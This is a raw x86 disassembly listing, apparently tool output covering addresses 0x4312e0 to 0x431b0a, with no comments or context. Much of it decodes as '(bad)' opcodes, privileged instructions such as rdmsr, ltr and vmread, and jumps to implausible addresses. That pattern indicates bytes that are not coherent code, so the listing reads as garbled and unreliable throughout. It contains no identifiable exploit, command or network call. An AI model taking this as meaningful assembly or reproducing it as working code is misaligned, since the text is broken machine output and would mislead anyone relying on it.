  4312e0:	mov    ecx,0xd74fb8
  4312e5:	add    cl,al
  4312e7:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4312ed:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4312f4:	(bad)  
  4312f5:	push   ebp
  4312f7:	mov    eax,0x8c2789
  4312fc:	ret    0x6689
  4312ff:	adc    BYTE PTR [ebp+0x48],0x8d
  431303:	add    bh,ah
  431305:	mov    WORD PTR [ebp-0x70],ax
  431309:	(bad)  
  43130a:	ret    0x667d
  43130d:	or     BYTE PTR [ebp-0x77],dl
  431310:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431317:	loop   0x4312a2
  431319:	(bad)  
  43131a:	xchg   esi,eax
  43131b:	aam    0xcf
  43131d:	out    dx,al
  43131e:	mov    DWORD PTR [esi-0x68],edi
  431321:	inc    ebp
  431322:	dec    edx
  431323:	pop    ecx
  431324:	mov    edx,DWORD PTR [eax]
  431326:	repnz push bp
  431329:	or     BYTE PTR [ebx+0x55106638],0x49
  431330:	(bad)  
  431331:	repnz xor eax,0xa0898945
  431337:	mov    ah,0x89
  431339:	jmp    DWORD PTR [edx+0x66b0418d]
  43133f:	inc    DWORD PTR [ebp+0x50]
  431342:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431346:	mov    DWORD PTR [eax],ecx
  431348:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431349:	pop    es
  43134a:	inc    ecx
  43134b:	(bad)  
  43134c:	data16 fwait
  43134e:	inc    ebp
  43134f:	xor    ah,BYTE PTR [esi+0x3]
  431352:	dec    ebp
  431353:	push   eax
  431354:	inc    bp
  431356:	jge    0x4312db
  431358:	mov    esp,DWORD PTR [esi-0x18]
  43135b:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  431361:	add    DWORD PTR [ebx],esi
  431363:	add    BYTE PTR [ebx],al
  431365:	test   DWORD PTR [ebx],esi
  431367:	(bad)  
  431368:	inc    WORD PTR [ebp+0x0]
  43136c:	mov    eax,DWORD PTR [eax]
  43136e:	call   0x8898caa3
  431373:	mov    esi,eax
  431375:	clc    
  431376:	ret    
  431377:	rol    cl,0xa
  43137a:	mov    DWORD PTR ds:0x7c0ec88,esi
  431380:	mov    edx,edi
  431382:	pushf  
  431383:	pop    es
  431384:	jmp    FWORD PTR [edx+0x66]
  431387:	add    BYTE PTR [ebp-0x990175],al
  43138d:	inc    ebp
  43138e:	test   DWORD PTR [ebx-0x2f00f202],eax
  431394:	push   ebp
  431395:	mov    edi,eax
  431397:	mov    dh,BYTE PTR [eax+0x266ff51]
  43139d:	push   ebp
  43139e:	add    BYTE PTR [ebx-0x764b0777],al
  4313a4:	dec    DWORD PTR [esi+0x661851e8]
  4313aa:	add    BYTE PTR [ebp-0x7b],dl
  4313ad:	cmp    esi,0xfffffffb
  4313b0:	dec    DWORD PTR [ecx+0x51fe9285]
  4313b6:	jmp    DWORD PTR [esi-0x75]
  4313b9:	push   ebp
  4313ba:	hlt    
  4313bb:	data16 (bad) 
  4313bd:	dec    ebp
  4313be:	ret    
  4313bf:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4313c5:	lea    edx,[eax-0x1]
  4313c8:	jne    0x43139b
  4313ca:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4313d0:	dec    BYTE PTR [ecx+0x51559eff]
  4313d6:	mov    DWORD PTR [esi-0x4c],esp
  4313d9:	push   ebp
  4313da:	jmp    DWORD PTR [esi-0x18]
  4313dd:	inc    ebp
  4313de:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4313e4:	(bad)  
  4313e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4313e6:	inc    eax
  4313e8:	test   DWORD PTR [esi-0x2],esp
  4313eb:	inc    ebp
  4313ec:	dec    DWORD PTR [ebp-0x760bde75]
  4313f2:	(bad)  
  4313f3:	test   al,0xc3
  4313f5:	mov    DWORD PTR [ebp-0x769b56],ecx
  4313fb:	lods   al,BYTE PTR ds:[esi]
  4313fc:	push   eax
  4313fd:	inc    ebp
  4313fe:	jne    0x43140f
  431400:	dec    DWORD PTR [ebp+0x8]
  431403:	mov    ecx,DWORD PTR [ebx]
  431405:	sbb    al,0x0
  431407:	(bad)  
  431408:	mov    eax,0xc14fc3
  43140d:	mov    DWORD PTR [ecx-0xbabf64],ecx
  431413:	movsx  ecx,WORD PTR [ebp+0x4e]
  431417:	xor    eax,DWORD PTR [eax]
  431419:	add    eax,edi
  43141b:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  431421:	xor    edi,DWORD PTR [eax+0x854f66]
  431427:	dec    BYTE PTR [ecx-0x76bb01]
  43142d:	mov    BYTE PTR [ebx-0x76724001],al
  431433:	pushf  
  431434:	inc    esi
  431435:	(bad)  
  431436:	dec    DWORD PTR [ebp-0x7abe6373]
  43143c:	sar    esi,0x89
  43143f:	dec    DWORD PTR [eax+0x0]
  431442:	inc    DWORD PTR [eax]
  431444:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  43144b:	xlat   BYTE PTR ds:[ebx]
  43144c:	dec    edx
  43144d:	add    bh,bh
  43144f:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431455:	lea    esp,[esi-0x50]
  431458:	(bad)  
  431459:	(bad)  
  43145a:	call   DWORD PTR [eax-0x1]
  43145d:	inc    ebp
  43145e:	rdpmc  
  431460:	add    BYTE PTR [ebx],al
  431462:	push   ax
  431464:	lea    eax,[ebp-0x1]
  43146a:	js     0x43146b
  43146c:	add    al,bh
  43146e:	push   bp
  431470:	lea    ecx,[ebp-0x7701]
  431476:	fmul   DWORD PTR [ebp-0x7a997800]
  43147c:	(bad)  
  43147d:	(bad)  
  43147e:	(bad)  
  43147f:	(bad)  
  431480:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431486:	dec    eax
  431487:	mov    eax,0x8d8dffff
  43148c:	mov    al,0xb0
  43148e:	(bad)  
  43148f:	call   DWORD PTR [ecx+0x50]
  431492:	dec    ebp
  431493:	inc    ebp
  431494:	mov    esi,0x7030833
  431499:	push   eax
  43149a:	into   
  43149b:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  4314a1:	call   DWORD PTR [ecx-0x8]
  4314a4:	lea    edx,[ebp-0x1]
  4314a7:	jmp    0x7616ab
  4314ac:	inc    eax
  4314ad:	jnp    0x43143c
  4314af:	add    dh,bh
  4314b1:	inc    WORD PTR [ebp-0x8a00b0]
  4314b8:	mov    edx,eax
  4314ba:	inc    esp
  4314bb:	add    bh,bh
  4314bd:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4314c3:	dec    DWORD PTR [ebx-0x7f820301]
  4314c9:	add    BYTE PTR [ecx],al
  4314cb:	data16 add BYTE PTR [ebp-0xb30077],al
  4314d2:	inc    eax
  4314d4:	(bad)  
  4314d5:	dec    si
  4314d7:	test   edi,edi
  4314d9:	(bad)  
  4314da:	cmp    edi,edi
  4314dc:	add    ecx,DWORD PTR [edi-0x39]
  4314df:	mov    edx,DWORD PTR [edx+0x66]
  4314e2:	inc    DWORD PTR [ebp-0x3d00cb]
  4314e8:	mov    eax,0x66ff8b5e
  4314ee:	jmp    0xb4ff:0xc7ff3895
  4314f5:	push   ecx
  4314f6:	inc    DWORD PTR [ebx-0x76ffccbb]
  4314fc:	call   DWORD PTR [esi-0x1]
  4314ff:	dec    DWORD PTR [eax]
  431501:	mov    ecx,0x805ff
  431506:	inc    ebp
  431507:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  43150d:	mov    ecx,0x35784
  431512:	add    BYTE PTR [ecx-0xffa59b],cl
  431518:	inc    ebp
  431519:	mov    ecx,0x9c6131
  43151e:	(bad)  
  43151f:	mov    eax,ebx
  431521:	pop    esp
  431522:	test   edi,edi
  431524:	clc    
  431525:	lea    eax,[ebp-0x24]
  431528:	cmp    eax,0xc7fe9c8d
  43152d:	push   eax
  43152f:	lea    eax,[ebp+0x45fff8fe]
  431535:	mov    esi,DWORD PTR [ecx]
  431537:	hlt    
  431538:	lahf   
  431539:	push   esp
  43153a:	mov    edx,DWORD PTR [ecx-0x4]
  43153d:	xor    eax,DWORD PTR [eax+0x7201bb]
  431543:	add    BYTE PTR [ebp-0x35],al
  431546:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  43154c:	mov    edx,DWORD PTR [ecx-0x74]
  43154f:	rol    BYTE PTR [eax],0x8d
  431552:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431556:	nop
  431557:	push   ecx
  431558:	add    bh,bh
  43155a:	mov    esp,edi
  43155c:	in     al,0x85
  43155e:	jge    0x43155e
  431560:	test   edi,edi
  431562:	jne    0x4314e9
  431564:	(bad)  
  431565:	(bad)  
  431566:	sbb    bh,bh
  431568:	push   ebp
  431569:	inc    ebp
  43156a:	call   0xffdc0ffa
  43156f:	add    BYTE PTR [ebp+0x66],al
  431572:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431578:	cmp    al,0x85
  43157a:	ud0    eax,DWORD PTR [ebp-0x1]
  43157e:	test   DWORD PTR [edi+0x74],ecx
  431581:	dec    edi
  431582:	inc    DWORD PTR [ebp-0x50004]
  431588:	dec    DWORD PTR [edi-0x75]
  43158b:	dec    esi
  43158c:	cld    
  43158d:	test   DWORD PTR [eax+0xff01ff],eax
  431593:	icebp  
  431594:	add    BYTE PTR [edi-0x3a],cl
  431597:	test   ebx,eax
  431599:	inc    BYTE PTR [ebp-0x1]
  43159c:	jne    0x43159e
  43159e:	mov    eax,DWORD PTR [eax]
  4315a0:	cld    
  4315a1:	xor    BYTE PTR [ecx+0x500155],cl
  4315a7:	push   ebp
  4315a8:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4315ae:	add    BYTE PTR [ebp+0x35e90f50],al
  4315b4:	add    al,BYTE PTR [eax]
  4315b6:	add    BYTE PTR [ebx-0x38fe4f80],al
  4315bc:	add    ah,ch
  4315be:	or     BYTE PTR [ebp+0x4501f845],dh
  4315c4:	jmp    0xdf18ba
  4315c9:	(bad)  
  4315ca:	nop    ecx
  4315cd:	test   DWORD PTR [ebp+0x4502f8],eax
  4315d3:	xor    ecx,DWORD PTR [ebp-0x64]
  4315d6:	mov    eax,edi
  4315d8:	mov    ebx,DWORD PTR [eax+edx*2]
  4315db:	add    eax,0x45fef885
  4315e0:	dec    DWORD PTR [ebx+0x339445]
  4315e6:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4315ec:	dec    DWORD PTR [ebx-0x460f0375]
  4315f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4315f3:	add    esi,edi
  4315f5:	add    bh,bh
  4315f7:	rdpmc  
  4315f9:	add    BYTE PTR [ebx],0x1
  4315fc:	mov    DWORD PTR [eax],eax
  4315fe:	add    al,0x45
  431600:	dec    DWORD PTR [ecx-0x360b3373]
  431606:	dec    DWORD PTR [esi]
  431608:	push   eax
  431609:	jne    0x431650
  43160b:	mov    esi,DWORD PTR [ebx]
  43160d:	cld    
  43160e:	add    esp,ecx
  431610:	push   eax
  431611:	inc    DWORD PTR [ebp-0x75]
  431614:	add    eax,0x800e4
  431619:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43161f:	mov    DWORD PTR [ecx],eax
  431621:	sbb    al,0x0
  431623:	leave  
  431624:	test   DWORD PTR [edi-0x2],eax
  431627:	jne    0x431628
  431629:	call   0xff44002e
  43162e:	xor    BYTE PTR [ebp+0x4d],al
  431631:	mov    edi,edi
  431633:	enter  0x8,0x4d
  431637:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43163d:	mov    eax,DWORD PTR [eax]
  43163f:	cld    
  431640:	add    DWORD PTR [ecx],ebx
  431642:	inc    ebp
  431643:	dec    ebp
  431644:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43164a:	inc    eax
  43164b:	dec    DWORD PTR [ecx-0x270375]
  431651:	add    BYTE PTR [ebx-0x39d72701],cl
  431657:	xchg   ecx,eax
  431658:	ret    
  431659:	add    BYTE PTR [ebp-0x830075],al
  43165f:	add    BYTE PTR [ebp-0x75],al
  431662:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431668:	lea    edi,[edi-0xc]
  43166b:	add    bh,bh
  43166d:	mov    edx,DWORD PTR [eax-0x7b]
  431670:	inc    ebp
  431671:	rdpmc  
  431673:	jne    0x431678
  431675:	add    BYTE PTR [eax-0x75],dl
  431678:	inc    ebp
  431679:	clc    
  43167a:	add    eax,0x400009
  43167f:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431685:	mov    eax,DWORD PTR [ecx]
  431687:	in     al,dx
  431688:	add    dh,al
  43168a:	test   ebx,eax
  43168c:	inc    BYTE PTR [ebp-0xff0001]
  431692:	add    BYTE PTR [ebp-0x43],al
  431695:	cmp    esi,0xfffffff8
  431698:	(bad)  
  431699:	push   DWORD PTR [eax]
  43169b:	add    BYTE PTR [ebp-0x3a],dl
  43169e:	test   ebx,eax
  4316a0:	je     0x431627
  4316a2:	mov    edi,edi
  4316a4:	sbb    al,0xff
  4316a6:	test   DWORD PTR gs:[eax],eax
  4316a9:	(bad)  
  4316aa:	js     0x4316ab
  4316ac:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4316b2:	sub    eax,ebx
  4316b4:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4316ba:	add    eax,DWORD PTR [eax]
  4316bc:	dec    ebp
  4316bd:	push   eax
  4316be:	mov    al,BYTE PTR [ebp+0x1]
  4316c1:	mov    eax,DWORD PTR [ebp-0x68]
  4316c4:	mov    eax,DWORD PTR [eax]
  4316c6:	sbb    bh,al
  4316c8:	or     ah,dh
  4316ca:	dec    ebp
  4316cb:	inc    DWORD PTR [eax+0x4]
  4316ce:	push   ecx
  4316cf:	add    BYTE PTR [edx-0x1],dh
  4316d2:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4316d8:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4316e2:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4316e8:	push   ecx
  4316e9:	cmp    BYTE PTR [ebx],al
  4316eb:	inc    ebp
  4316ec:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4316f2:	(bad)  
  4316f3:	(bad)  
  4316f4:	in     al,0xff
  4316f6:	add    BYTE PTR [ebp+0x0],al
  4316f9:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4316ff:	add    al,bh
  431701:	(bad)  
  431702:	jmp    0x8d85:0x74b0558d
  431709:	dec    DWORD PTR [eax]
  43170b:	call   DWORD PTR [ebp-0x7b]
  43170e:	mov    edi,esi
  431710:	lock call DWORD PTR [ebp-0x75]
  431714:	mov    esi,esp
  431716:	mov    ah,0xc6
  431718:	mov    bh,0xc3
  43171a:	mov    DWORD PTR [ebx-0x110003c4],ecx
  431720:	add    DWORD PTR [eax],0x450050ff
  431726:	mov    DWORD PTR [ebx+0x9598cc],ecx
  43172c:	inc    edi
  43172e:	push   esp
  431730:	jmp    0xcd00:0x650481ff
  431737:	mov    DWORD PTR [ebx],esi
  431739:	clc    
  43173a:	cmp    edi,0xff9cff3c
  431740:	jne    0x43174a
  431742:	mov    eax,eax
  431744:	add    esi,DWORD PTR [eax]
  431746:	int3   
  431747:	inc    ebp
  431748:	cmp    al,0x83
  43174a:	add    BYTE PTR [eax],bl
  43174c:	adc    DWORD PTR [ebx+0x768b5055],eax
  431752:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431758:	mov    edi,eax
  43175a:	cmp    BYTE PTR [ebp+0x45],cl
  43175d:	jmp    0x4316ea
  43175f:	mov    ebx,DWORD PTR [esp+ebp*8]
  431762:	inc    ebp
  431763:	or     al,0x2
  431765:	dec    DWORD PTR [ebp+0x18]
  431768:	jne    0x4317bf
  43176a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  431770:	mov    edi,DWORD PTR [ebx]
  431772:	in     al,0x50
  431774:	xchg   ecx,eax
  431775:	jmp    0x343667a
  43177a:	adc    al,0x8b
  43177c:	inc    ebp
  43177d:	mov    al,ds:0x8b04008b
  431782:	push   ebp
  431783:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431789:	push   ebp
  43178a:	test   DWORD PTR [ebx-0x2800d701],ecx
  431790:	inc    ebp
  431791:	dec    ebp
  431792:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431798:	mov    DWORD PTR [eax],0xe9ff00f4
  43179e:	add    al,0x0
  4317a0:	add    BYTE PTR [eax],al
  4317a2:	mov    eax,edx
  4317a4:	push   eax
  4317a5:	rol    DWORD PTR [ebp-0xf0177],1
  4317ab:	bound  eax,QWORD PTR [ebp+0x50]
  4317ae:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4317b4:	add    BYTE PTR [ecx+0x558df0ff],cl
  4317ba:	mov    al,0xf
  4317bc:	test   DWORD PTR [edx],edx
  4317be:	call   DWORD PTR [ebp-0x7a0001]
  4317c4:	(bad)  
  4317c5:	loop   0x4317c6
  4317c7:	jnp    0xc6990bcd
  4317cd:	mov    eax,ebx
  4317cf:	cmp    al,0x8b
  4317d1:	(bad)  
  4317d2:	cld    
  4317d3:	shr    esi,0xc
  4317d6:	add    dl,al
  4317d8:	push   eax
  4317d9:	lea    eax,[ebp-0x1]
  4317dc:	mov    edx,esi
  4317de:	cwde   
  4317df:	cli    
  4317e0:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4317e6:	or     BYTE PTR [eax],cl
  4317e8:	inc    ebp
  4317e9:	dec    ebp
  4317ea:	inc    DWORD PTR [ebx+0x74803914]
  4317f0:	add    DWORD PTR [ebx+0x451800],ecx
  4317f6:	call   DWORD PTR [eax+edx*1]
  4317f9:	add    ecx,DWORD PTR [ebp-0x34]
  4317fc:	push   edi
  4317fd:	adc    al,0x8
  4317ff:	mov    edx,DWORD PTR [ebp-0x14]
  431802:	mov    ecx,DWORD PTR [ebp+0x18]
  431805:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431809:	inc    DWORD PTR [eax+esi*8]
  43180c:	inc    ebp
  43180d:	stos   BYTE PTR es:[edi],al
  43180e:	mov    edx,DWORD PTR [ebp-0x4]
  431811:	add    DWORD PTR [ebp-0x1c],eax
  431814:	mov    edx,DWORD PTR [ebp-0x70]
  431817:	cmp    eax,DWORD PTR [eax]
  431819:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43181a:	mov    eax,DWORD PTR [eax]
  43181c:	cld    
  43181d:	jae    0x43179f
  43181f:	add    eax,DWORD PTR [ecx]
  431821:	clc    
  431822:	add    BYTE PTR [eax+0x30],dl
  431825:	mov    DWORD PTR [ecx],esi
  431827:	clc    
  431828:	pop    ds
  431829:	inc    ebp
  43182a:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  431830:	(bad)  
  431831:	push   DWORD PTR [edi]
  431833:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431839:	(bad)  
  43183a:	jae    0x43183b
  43183c:	mov    eax,DWORD PTR [ebp-0x740175]
  431842:	sub    eax,DWORD PTR [eax]
  431844:	add    eax,DWORD PTR [eax]
  431846:	mov    DWORD PTR [ecx+0x5f],eax
  431849:	mov    DWORD PTR [ebx-0x4],ebx
  43184c:	ret    0xff
  43184f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431855:	ret    
  431856:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43185c:	add    BYTE PTR [ebp-0x7d],al
  43185f:	mov    DWORD PTR [eax],eax
  431861:	add    al,0x84
  431863:	inc    DWORD PTR [ecx]
  431865:	lea    eax,[eax]
  431867:	hlt    
  431868:	sar    bh,cl
  43186a:	test   BYTE PTR [eax+0x1],dl
  43186d:	inc    ebp
  43186e:	add    BYTE PTR [ebx],dh
  431870:	test   BYTE PTR [ebx],0x84
  431873:	push   eax
  431874:	add    BYTE PTR [ebp+0x0],al
  431877:	add    eax,0x86
  43187c:	add    BYTE PTR [ebx-0x7f7b0340],cl
  431882:	add    BYTE PTR [ecx],al
  431884:	add    BYTE PTR [eax],al
  431886:	mov    esi,0x550030
  43188b:	mov    ecx,DWORD PTR [edi]
  43188d:	cld    
  43188e:	fidiv  DWORD PTR [ebp+0x0]
  431891:	mov    edi,DWORD PTR [ecx]
  431893:	xor    BYTE PTR [eax+eax*1],0x84
  431897:	add    eax,DWORD PTR [eax]
  431899:	sbb    BYTE PTR [eax],al
  43189b:	jne    0x43184e
  43189d:	mov    eax,DWORD PTR [ecx]
  43189f:	sbb    BYTE PTR [eax],al
  4318a1:	mov    DWORD PTR [ebp-0x1],esp
  4318a4:	add    BYTE PTR [eax+0x30e45ca],bh
  4318aa:	ret    0xb7fc
  4318ad:	dec    ebp
  4318ae:	or     al,0x89
  4318b0:	dec    ebp
  4318b1:	cld    
  4318b2:	cmovne ecx,DWORD PTR [eax-0x75]
  4318b6:	add    edi,esp
  4318b8:	seto   BYTE PTR [esi-0x72ffffff]
  4318bf:	inc    ebp
  4318c0:	adc    al,0x8b
  4318c2:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4318c9:	cmp    DWORD PTR [edi+0x72],edx
  4318cc:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4318d2:	gs cmp al,0x0
  4318d5:	je     0x4318ad
  4318d7:	push   eax
  4318d8:	sar    BYTE PTR [eax],1
  4318da:	mov    bh,0x3e
  4318dc:	push   cs
  4318dd:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4318e3:	add    DWORD PTR [ecx+0x12],ebp
  4318e6:	dec    edx
  4318e7:	(bad)  
  4318e8:	mov    eax,edx
  4318ea:	in     al,dx
  4318eb:	adc    DWORD PTR [ecx],esi
  4318ed:	pop    esi
  4318ee:	inc    ecx
  4318ef:	leave  
  4318f0:	or     DWORD PTR [eax],ebx
  4318f2:	gs push ebp
  4318f4:	add    ah,ch
  4318f6:	into   
  4318f7:	in     al,dx
  4318f8:	enter  0xb756,0xf0
  4318fc:	push   cs
  4318fd:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431907:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  43190d:	jnp    0x74439e15
  431913:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431919:	add    BYTE PTR [edi],cl
  43191b:	mov    edi,DWORD PTR [ecx-0x78]
  43191e:	ltr    WORD PTR [ecx-0x7b]
  431922:	dec    DWORD PTR [edi]
  431924:	clc    
  431925:	out    0x45,eax
  431927:	add    BYTE PTR [eax],cl
  431929:	cmp    ebx,0xffffff8c
  43192c:	jge    0x43192e
  43192e:	jb     0x431940
  431930:	je     0x5219b0
  431936:	pop    edx
  431937:	push   esi
  431938:	mov    ecx,DWORD PTR [edi]
  43193a:	in     al,dx
  43193b:	rol    DWORD PTR [ebp+0x0],1
  43193e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431945:	cmp    DWORD PTR [ecx],0xfffffff0
  431948:	hlt    
  431949:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43194f:	(bad)  
  431951:	push   eax
  431952:	jns    0xb842fdd0
  431958:	lock push cs
  43195a:	ror    edx,0x3
  43195d:	test   BYTE PTR [ecx+0x5500e800],cl
  431963:	dec    eax
  431964:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431968:	(bad)  
  431969:	mov    esi,0x7f33ff5f
  43196e:	inc    eax
  43196f:	test   DWORD PTR [edx],eax
  431971:	je     0x431933
  431973:	mov    ecx,ecx
  431975:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431979:	and    eax,DWORD PTR [eax+0xf0103]
  43197f:	jp     0x43196d
  431981:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431985:	add    edx,DWORD PTR [edi+0x74]
  431988:	sbb    BYTE PTR [ebp+0x4d001484],cl
  43198e:	add    BYTE PTR [ebp-0x74c48bbb],al
  431994:	je     0x431919
  431996:	cmp    eax,edi
  431998:	js     0x4319bd
  43199a:	add    eax,0xeb0fc003
  43199f:	jns    0x43192c
  4319a1:	vmread DWORD PTR [ecx+0x45],ebx
  4319a5:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  4319ab:	adc    al,0x8b
  4319ad:	jge    0x4319c3
  4319af:	mov    edi,DWORD PTR [eax-0x4]
  4319b2:	add    edi,DWORD PTR [edi]
  4319b4:	or     bh,bh
  4319b6:	push   ebp
  4319b7:	push   es
  4319b8:	mov    DWORD PTR [ebp-0x4],ebx
  4319bb:	add    edi,esi
  4319bd:	pop    es
  4319be:	add    esi,DWORD PTR [edi-0x48ccf183]
  4319c4:	mov    DWORD PTR [esp+esi*8],ecx
  4319c7:	inc    ebp
  4319c8:	pop    ebp
  4319c9:	xor    DWORD PTR [esi-0x4],0x3b
  4319cd:	add    edx,DWORD PTR [ecx+edi*1]
  4319d0:	push   es
  4319d1:	clc    
  4319d2:	mov    bh,0xdb
  4319d4:	jp     0x43198d
  4319d6:	add    cl,BYTE PTR [esi]
  4319d8:	div    DWORD PTR [edi+0x4d8b0c1c]
  4319de:	test   edi,edi
  4319e0:	je     0x4319d6
  4319e2:	mov    eax,ecx
  4319e4:	or     BYTE PTR [ebx],al
  4319e6:	dec    BYTE PTR [ecx+0x7d3bec7d]
  4319ec:	jbe    0x431a60
  4319ee:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  4319f4:	add    ecx,DWORD PTR [esi]
  4319f6:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  4319fc:	add    eax,DWORD PTR [ebx-0x287af783]
  431a02:	je     0x431a51
  431a04:	mov    DWORD PTR [ecx],edi
  431a06:	mov    esi,eax
  431a08:	hlt    
  431a09:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431a10:	jb     0x4319d2
  431a12:	jmp    0x4319ff
  431a14:	xor    esi,DWORD PTR [ebx]
  431a16:	pop    edi
  431a17:	pop    esi
  431a18:	pop    ebx
  431a19:	ret    
  431a1a:	ret    0x8b
  431a1d:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431a23:	xor    DWORD PTR [ecx],0xc
  431a26:	pushf  
  431a27:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431a2d:	rdmsr  
  431a2f:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431a36:	dec    ebp
  431a37:	ret    
  431a38:	mov    edi,DWORD PTR [esi-0x4]
  431a3b:	pop    eax
  431a3c:	dec    ebp
  431a3d:	jne    0x4319ca
  431a3f:	xor    edi,esp
  431a41:	inc    eax
  431a42:	dec    ebp
  431a43:	jbe    0x431a98
  431a45:	inc    eax
  431a46:	pop    ebp
  431a47:	add    edx,DWORD PTR [esi+0x8]
  431a4a:	push   esp
  431a4b:	dec    eax
  431a4c:	push   ecx
  431a4d:	mov    eax,edi
  431a4f:	and    al,0xf0
  431a51:	jo     0x431a3e
  431a53:	mov    eax,DWORD PTR [ebx]
  431a55:	sbb    BYTE PTR [ebp+0x4d],cl
  431a58:	mov    eax,DWORD PTR [ebx]
  431a5a:	nop
  431a5b:	or     BYTE PTR [eax],al
  431a5d:	jne    0x431ab6
  431a5f:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431a65:	cld    
  431a66:	xor    edi,edi
  431a68:	add    edi,DWORD PTR [ebp+0x3]
  431a6b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431a71:	js     0x4319f7
  431a73:	jae    0x431a77
  431a75:	(bad)  
  431a77:	xor    al,0x5d
  431a79:	jmp    0x431a06
  431a7b:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431a82:	fdecstp 
  431a84:	test   BYTE PTR [edi],ah
  431a86:	add    bh,BYTE PTR [ebp+0x0]
  431a89:	add    ebx,DWORD PTR [ebp-0x77]
  431a8c:	mov    edi,eax
  431a8e:	cmp    al,0x0
  431a91:	adc    dh,BYTE PTR [ebx]
  431a93:	jge    0x431a98
  431a95:	mov    edi,DWORD PTR [ebx]
  431a97:	jl     0x431aa8
  431a99:	clc    
  431a9a:	dec    edi
  431a9b:	jge    0x431a9d
  431a9d:	mov    eax,DWORD PTR [ebx]
  431a9f:	jb     0x431aa9
  431aa1:	mov    ecx,DWORD PTR [ebp-0x8]
  431aa4:	mov    edi,edi
  431aa6:	xor    edx,DWORD PTR [eax]
  431aa8:	add    edi,DWORD PTR [ebx]
  431aaa:	mov    DWORD PTR [ebp-0x10],edi
  431aad:	inc    edi
  431aae:	pop    ebp
  431aaf:	jge    0x431aec
  431ab1:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431ab5:	mov    edx,0xc05d87f0
  431aba:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431abe:	fimul  WORD PTR [eax]
  431ac0:	fist   WORD PTR [ebp+0x1c]
  431ac3:	in     al,dx
  431ac4:	jne    0x431ab2
  431ac6:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431acc:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431ad0:	fdivp  st(0),st
  431ad2:	fild   WORD PTR [ebp+0x4510f85c]
  431ad8:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431ade:	inc    ebp
  431adf:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431ae5:	mov    ebp,DWORD PTR [ebx-0x4]
  431ae8:	adc    al,0x8b
  431aea:	rcl    DWORD PTR [eax],0x48
  431aed:	mov    esi,0x7080803
  431af2:	fiadd  WORD PTR [ebp+0x4d]
  431af5:	(bad)  
  431af6:	mov    edx,DWORD PTR [edx-0x4]
  431af9:	mov    edx,DWORD PTR [ebp-0x4]
  431afc:	xor    ebx,DWORD PTR [ebx+0x330103]
  431b02:	mov    DWORD PTR [edi+0x872dc],edi
  431b08:	xlat   BYTE PTR ds:[ebx]
  431b09:	into   
  431b0a:	ffreep st(6)
